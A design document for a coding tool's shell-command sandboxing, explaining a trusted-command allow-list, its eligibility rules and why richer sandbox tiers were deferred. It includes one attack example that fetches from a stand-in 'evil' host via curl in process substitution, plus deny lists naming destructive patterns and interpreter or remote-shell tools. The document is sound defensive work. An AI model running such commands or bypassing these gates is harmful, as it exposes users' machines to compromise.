# Command sandboxing routing

**Status:** shipped as a **trusted-command allow-list** (the safe core). The
richer read/write/container tier model below is designed but deferred — see
"Why the tiers were deferred".

## Motivation

Today a shell command gets one of two fates (`permission-policy.ts` →
`decideShellPermission`), derived from a 3-way heuristic verdict in
`shell-scope.ts`: auto-run inside the seatbelt (`sandbox`/`ambiguous`), or prompt
and run unsandboxed (`external`). That's coarse in one costly direction: some
commands genuinely **cannot** run inside the workspace sandbox (they need the
host toolchain, code signing, or vendor endpoints — `xcodebuild` is the canonical
case) yet are entirely safe for a trusted project. Under the binary model they
hit `external` and prompt on every invocation — pure prompt fatigue, which trains
users to disable the gate (violating principle #3 in `docs/threat-model.md`).

## What shipped: a trusted-command allow-list

A per-user list of command **basenames** the user trusts to run **unsandboxed
with no prompt**. Configured in Settings → Local models → "Trusted commands"
(one name per line). The allow-list is honoured **only** when:

- **auto-run is enabled** (the global toggle), AND
- **the workspace is trusted** (`isWorkspaceTrusted` — the same gate that keeps a
  cloned repo's MCP servers inert; a freshly-cloned untrusted repo can carry a
  list but never gets its commands auto-run), AND
- the command passes the eligibility rules below.

### Eligibility (`resolveCommandRouting`)

A command runs unsandboxed-no-prompt (`allow`) only when **every** condition holds
— otherwise it `defer`s to the existing gate, which sandboxes or prompts exactly
as before (purely additive: nothing that auto-runs today starts prompting):

1. No command substitution, subshell grouping, or backticks (``/[`(]/`` — over-broad
   on purpose; a false positive only means "use the normal path"). This catches
   `$(…)`, `` `…` ``, and process substitution `<(…)`/`>(…)`.
2. No destructive-in-sandbox pattern on the whole command (`rm -rf`, fork bombs,
   pipe-to-interpreter, …) — reuses `dangerousInSandboxReasons`.
3. **Every** top-level segment (split on `&&`/`||`/`;`/`|`/`&`, quote- and
   escape-aware) is either:
   - an explicitly **trusted** command (basename in the list), whose waiver
     applies to that segment only; **or**
   - a **trivially-safe prep** command (`mkdir`, `cd`, `echo`, `pwd`, `printf`,
     `true`, `false`, `:`, `basename`, `dirname`) that itself shows **no**
     network/outside-workspace signal under `analyzeShellCommand` (verdict must be
     `sandbox`) and is not destructive.
4. At least one segment is actually trusted (else nothing needs to escape the
   sandbox — it runs contained via the normal path).
5. No segment's head is an interpreter/shell/remote-exec tool (`sh`, `bash`,
   `node`, `python`, `ssh`, `sudo`, `find`, `xargs`, `awk`, …). Trusting one of
   those would turn a single grant into an unbounded escape, so the list entry is
   ignored.

### Why this is safe (and how it differs from the first attempt)

The first implementation resolved a compound command to the **most-permissive
tier across its segments** and ran the whole line there. That was unsound: a
`sandbox`-verdict segment like `npm test` is only safe _because the seatbelt
denies it network + home_. Running the whole line unsandboxed because a sibling
was `allow` meant `npm test && xcodebuild` executed an arbitrary repo test script
**unsandboxed with full network** — the exact thing the design claimed to
prevent.

The allow-list model closes that:

- The trust waiver is **per-segment**. A sibling `curl` / `git push` / `npm test`
  is neither trusted nor trivially-safe → the whole command `defer`s → the normal
  gate sandboxes or prompts it. Nothing sandbox-dependent runs unsandboxed.
- Analysis is **never** skipped for a co-segment (`xcodebuild <(curl evil)` →
  substitution gate → defer → normal gate prompts on `curl`).
- Interpreters can't be trusted, so `bash`/`node`/`sh` on the list are ignored.
- Honoured only in a **trusted workspace**, so a cloned repo can't benefit.
- The gate (does it prompt?) and the tool / todo-verification (does it run
  unsandboxed?) call the **same** `routeShellCommand` on the **same raw command**,
  so the prompt decision and the execution context cannot disagree.

## How it's wired

- `src/shared/command-routing.ts` — renderer-safe types + text (`parse`/`format`/
  `sanitize`) for the allow-list; `TRUSTED_COMMANDS_SETTING`.
- `src/main/services/security/command-routing.ts` — pure `resolveCommandRouting`
  (allow/defer), quote- and escape-aware `splitSegments`, `shell-quote`-based
  `commandHead`, the safe-prep and non-trustable sets.
- `src/main/services/security/command-routing-config.ts` — `routeShellCommand`
  (auto-run + workspace-trust gating, cached allow-set) and `shellRunsOutsideSandbox`,
  the single unsandboxed-decision helper shared by the tool and todo checks.
- `permission-gate.ts` — trusted fast path returns `true` (no prompt) on `allow`.
- `shell-tool.ts` / `todo-verification.ts` — `shellRunsOutsideSandbox(command)`.
- Settings: `trustedShellCommands` (validated by `trustedShellCommandsSchema`) +
  the "Trusted commands" fieldset.

## Why the tiers were deferred

The original exploration proposed `read`/`write`/`container`/`allow` tiers. A code
review found the tier machinery added risk without proportional value in v1:

- **`write`** is identical to today's default overlay — a no-op as a user setting.
- **`read`** (a read-only seatbelt overlay) is a genuine tightening, but the
  redirect detection was unreliable and a read-overlay write-denial escalated the
  retry to _fully unsandboxed_ — a defense-in-depth regression. Deferred until the
  write-capability detection lives in the shared analyzer.
- **`container`** had **no backend** (macOS seatbelt only), yet was frozen into
  the persisted schema, preload types, Settings copy, and an invented
  `allow`+`container` incompatibility rule. Speculative API over user-persisted
  settings. Deferred until a real runner exists.

Only `allow` (the trusted list) carries real, safe value today, so that's what
shipped. The tier vision remains valid as future work.

### Remaining follow-ups

- A real `container` backend (Linux: bubblewrap/nsjail/Docker; macOS: Apple
  `container`/microVM), then reintroduce the tier with validated semantics.
- A read-only overlay tier once write-capability detection is modelled in
  `shell-scope.ts` (shared by the analyzer and the tier), with a sandboxed
  (not unsandboxed) failure fallback.
- `run_background` currently always sandboxes; extend the allow-list to it if a
  trusted long-lived task is needed.
- A focused WebdriverIO e2e for the new Settings fieldset (per `AGENTS.md`).
- "Always trust this command" affordance on the escalation prompt (prompt-once →
  add to the list).
